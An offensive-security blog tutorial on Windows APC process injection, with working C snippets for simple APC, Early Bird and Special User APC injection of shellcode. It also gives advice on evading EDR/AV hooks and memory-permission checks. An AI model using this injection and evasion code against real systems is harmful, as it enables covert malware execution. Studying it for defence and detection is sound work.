---
layout: default
---

# Process Injection: APC Injection

APC Injection is another sub-technique of Process Injection like remote thread injection. if this subject is totally new to you I strongly recommend you to read my previous post that is about [remote thread injection](https://aliongreen.github.io/posts/remote-thread-injection.html). In this post, we are going to talk about APC Injection in remote threads. we want to find out what APC is and how we can use it to run our malicious code. 

there are different ways of using APCs to achieve process injection. we are going to try three different ways of using it.

- Simple APC Injection (Injection APC into all of the target process threads)
- Early Bird Injection
- Special User APC

## What is APC?

[Asynchronous Procedure Call](https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) or APC is a function to run code in the context of another thread. every thread has it's own queue of APCs. if the thread enters an alertable state it starts to do APC jobs in the form of first in first out (FIFO). A thread can enters an alertable state by using **SleepEx**, **SignalObjectAndWait**, **MsgWaitForMultipleObjectsEx**, **WaitForMultipleObjectsEx**, or **WaitForSingleObjectEx** functions.

```
+---------------------+                                                 +---------------------+       
|                     |                                                 |                     |       
|                     |                                                 |                     |       
|                     |                                                 |                     |       
|   Malware Process   |                                                 |   svchost process   |       
|                     |               1 allocating space                |                     |       
|                     |-----------------------------------------------> |---------------------|       
|                     |                                                 |                     |       
|                     |                                                 |      shellcode      |       
|                     |               2 writing shellcode               |                     |       
+---------------------+-----------------------------------------------> +---------------------+       
           |                                                                     ^                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     |                    
           |                                                                     v                    
           |                                                     +-----------------------------+      
           |                                                     |                             |      
           |                                                     |                             |      
           |                                                     |         thread 1112         |      
           |                                                     |                             |      
           |                                                     |-----------------------------|      
           |                                                     |              |              |      
           |             3 Queue an APC to thread 1112           |exec shellcode|other jobs... |      
           +---------------------------------------------------->|              |              |      
                                                                 +-----------------------------+      
                                                                           APC Queue                                              
```
*figure 1 - APC injection to a remote thread* 


## Simple APC Injection or Queue an APC into All the threads

The is the simplest implementation of APC injection. as there is no function to find if a thread is alertable or not the easiest way is to queue an APC into all of the target process threads and we can assume one of the threads is alertable and run our APC job. **svchost** process is a good choice as it almost always has alertable threads. the problem with this technique is that it's unpredictable somehow, and in many cases, it can run shellcode multiple times. 

These are the steps to implement simple APC injection:

1- Find the target process id

2- Allocate space in the target process for your shellcode

3- Write your shellcode in the allocated space.

4- Find target process threads

5- Queue an APC to all of them to execute your shellcode

For the first step, we need to find the process id of our target process. if you have read the [previous post](https://aliongreen.github.io/posts/remote-thread-injection.html) you know how to find a process id of an arbitrary process. here we have created a function called **find_process** that returns the target process id.

Then, we need to allocate memory space for our shellcode in the target process using the [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) function. we should allocate this location with **PAGE_EXECUTE_READWRITE** (Execute, Read, Write) permissions. most of the time allocating memory location with **RWX** permission could trigger EDR/AV. instead, we can allocate the location with **PAGE_READWRITE** (Read, Write) permissions at first, and after writing the shellcode we can change the permission of the memory location to **PAGE_EXECUTE_READ** (Execute, Read) using [VirtualProtectEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex) function. but remember that your shellcode should not be self modifying because in that case it needs to write into the memory location and it doesn't have the write permission to do it.
 
```c
DWORD OldProtect = 0;
DWORD target_process_id = find_process(TARGET_PROCESS_NAME);
HANDLE target_process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, target_process_id);
LPVOID target_process_buffer = VirtualAllocEx(target_process_handle, NULL, (SIZE_T) sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
WriteProcessMemory(target_process_handle, target_process_buffer, shellcode, (SIZE_T) sizeof(shellcode), NULL);
VirtualProtectEx(target_process_handle, target_process_buffer, (SIZE_T) sizeof(shellcode), PAGE_EXECUTE_READ, &OldProtect);
```
Then we should get the list of all the system threads using [CreateToolhelp32Snapshot](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot) with **TH32CS_SNAPTHREAD** flag and iterate through all the threads using [Thread32First](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32first) and [Thread32Next](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-thread32next) functions to find the threads of our victim process. both of these functions get a pointer to the [THREADENTRY32](https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-threadentry32) struct that will be filled with the information about the thread after calling these functions. we compare the **th32OwnerProcessID** member of our **THREADENTRY32** instant with the target process id to see if the thread belongs to our victim process. this member actually shows the process id of the thread owner. 

If the thread belongs to our target process we queue an APC to the thread using the [QueueUserAPC](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) function. the first parameter should be a pointer to the function that we want to execute which is a pointer to our shellcode and the second parameter is a handle to the remote thread.

```c
THREADENTRY32 te;
te.dwSize = sizeof(THREADENTRY32);
	
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
	if (te.th32OwnerProcessID == target_process_id) {
		
		HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);
			
		if (QueueUserAPC((PAPCFUNC)target_process_buffer ,target_thread_handle, NULL)) {
			printf("Queuing an APC to thread id %d\n", te.th32ThreadID);
		}
			
	}
}
```

this was the implementation of Simple APC Injection using Win32 APIs. we can also implement this technique using Native APIs or Syscalls. in the previous post we worked with most of the Native APIs that could be used here. now we have two new native APIs that we have not already used. **OpenThread** and **QueueUserAPC** functions are the two new APIs here. the Native APIs equivalent to them are **NtOpenThread** and **NtQueueApcThread**, respectively. you can find their definition and usage in the PoC on my [Github](https://github.com/AlionGreen/apc-injection/blob/main/NTAPI/main.c) account.

## Early Bird Injection

We already mentioned that a thread can only run APC jobs if it enters an alertable state. there is also one other way to run APC jobs. **NtTestAlert** is a function that checks the APC queue of the current thread and if there is any queued job it runs them to empty the queue. when a thread starts the **NtTestAlert** is called before anything. so if you queue your APC at the beginning state of a thread you can safely run your job.  

> Note: If you want to inject your shellcode into the local process you can APC to the current thread and call the **NtTestAlert** function to execute the shellcode.

In Early Bird, we start by creating a process (like svchost) in a suspended state, then queuing an APC to the main thread, and resuming the thread afterward. So, before the thread starts to execute the main code it calls the **NtTestAlert** function to empty the APC queue of the current thread and run the queued jobs. this technique had been used to evade the AV/EDR hooking process. because it tries to run the malicious code before the AV/EDR had a chance to place its hook in the newly created process. 

First, we need to open our target process using the [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function. we should provide the path of our executable and a pointer to [STARTUPINFOA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) and [PROCESS_INFORMATION](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) structs as arguments. we should also take the **CREATE_SUSPENDED** value for the **dwCreationFlags** parameter to create the process in a suspended state. 

```c
STARTUPINFOA si = { 0 };
PROCESS_INFORMATION pi = { 0 };

CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
```
if the function succeeds to create the new process there will be a handle to the newly created process and thread respectively in **hProcess** and **hThread** member of the **pi** object. then, we allocate memory space for our shellcode in the target process and write the shellcode in it, and we queue our APC to the main thread and resume the thread.

```c
LPVOID target_process_buffer = NULL;
target_process_buffer = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, target_process_buffer, shellcode, (SIZE_T)sizeof(shellcode),NULL);

QueueUserAPC((PAPCFUNC)target_process_buffer, pi.hThread, NULL);
ResumeThread(pi.hThread);
``` 

## Special User APC or NtQueueApcThreadEx

Special User APC is a new system call that has been added since the RS5 release of windows and could be achieved by using the **NtQueueApcThreadEx** function. normally, a thread can only run APCs when it enters an alertable state. but using Special User APC we can force a thread to run APC without entering an alertable state. but remember using special user APC could be dangerous in some cases and lead the thread to deadlock. read [repnz](https://repnz.github.io/posts/apc/user-apc/) post for more information.

We implement Special User APC using syscalls. We use [SysWhisper](https://github.com/jthuraisamy/SysWhispers) to generate syscalls and their definition. then we add the **header** and **asm** files to our project. you should also enable **MASM** in the visual studio for your project.
```bash
python syswhispers.py -f NtQueueApcThreadEx,NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtOpenThread --version 10 -o syscalls
```
All the steps that we take to utilize Special User APC for APC injection are like the Simple APC Injection. the only difference is that we don't APC to all threads in this case. we use the **NtQueueApcThreadEx** function to queue a special APC to the first thread that belongs to our target process.

```c
typedef enum _QUEUE_USER_APC_FLAGS {
	QueueUserApcFlagsNone,
	QueueUserApcFlagsSpecialUserApc,
	QueueUserApcFlagsMaxValue
} QUEUE_USER_APC_FLAGS;


typedef union _USER_APC_OPTION {
	ULONG_PTR UserApcFlags;
	HANDLE MemoryReserveHandle;
} USER_APC_OPTION, *PUSER_APC_OPTION;
```
then we initialize the structs and call the function.
```c
USER_APC_OPTION UserApcOption;
UserApcOption.UserApcFlags = QueueUserApcFlagsSpecialUserApc;

for (Thread32First(snapshot, &te); Thread32Next(snapshot, &te);) {
	if (te.th32OwnerProcessID == target_process_id) {


		HANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, te.th32ThreadID);

		NtQueueApcThreadEx(target_thread_handle, QueueUserApcFlagsSpecialUserApc, (PKNORMAL_ROUTINE)target_process_buffer, NULL, NULL, NULL);

		CloseHandle(target_thread_handle);
		break;

	}
}
```
You can find all of the PoCs for this post on my [Github](https://github.com/AlionGreen/apc-injection) account.

## Credits

Thanks to [0x00dtm](https://twitter.com/0x00dtm) for helping me. 

Thanks to [batsec](https://twitter.com/_batsec_) and [Upayan](https://twitter.com/slaeryan) for sharing great resources with me.

## References

[https://repnz.github.io/posts/apc/user-apc/](https://repnz.github.io/posts/apc/user-apc/)

[https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/apc-queue-code-injection)

[https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection](https://www.ired.team/offensive-security/code-injection-process-injection/early-bird-apc-queue-code-injection)

[http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1](http://rinseandrepeatanalysis.blogspot.com/2019/04/early-bird-injection-apc-abuse.html?m=1)

[https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/](https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/)
